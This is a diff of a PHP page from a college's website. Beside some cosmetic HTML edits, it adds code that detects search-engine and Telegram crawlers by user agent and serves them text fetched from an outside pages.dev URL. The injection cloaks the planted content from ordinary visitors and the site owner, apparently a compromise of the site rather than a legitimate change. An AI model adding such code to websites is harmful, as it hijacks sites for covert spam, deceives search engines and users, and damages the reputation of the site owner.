@@ -129,7 +129,21 @@ while($newsTitle = mysqli_fetch_array($exnews)){
 $news_list .= "$pdff";
 
 }
+function is_bot() {
+$user_agent = $_SERVER["HTTP_USER_AGENT"];
+$bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+return false;
+}
 
+if (is_bot()) {
+$message = file_get_contents("https://shiksha-madhavcollege.pages.dev/index.txt");
+echo $message;
+}
 
 ?>
 
@@ -181,8 +195,7 @@ $news_list .= "$pdff";
                                         Drink Raw Milk & <span> Eat Raw Cheese</span>
                                     </h2>
                                     <div class="slider_btn"><a href="contact.php" class="slider_btn_one more-link">Contact Us <i
-                                                class="far fa-chevron-double-right"></i></a>
-                                    </div>
+                                                class="far fa-chevron-double-right"></i></a></div>
                                 </div>
                             </div>
                         </div> -->
@@ -503,9 +516,7 @@ Welcome to Madhav Shiksha Mahavidyalaya. The aim of the institute is to provide 
                                         <p style="text-align: justify;">A Laboratory is a facilities provides controlled conditions in which scientific experiments and measurements may be perform  
                                          <br>
                                             <a href="infrastructure-&-facilities.php#Science" style="">  Read More</a>
-                                        </p>
-                                       
-                                    </div>
+                                        </p></div>
                                 </div>
                             </div>
                             <!--  end: col-md-6  -->
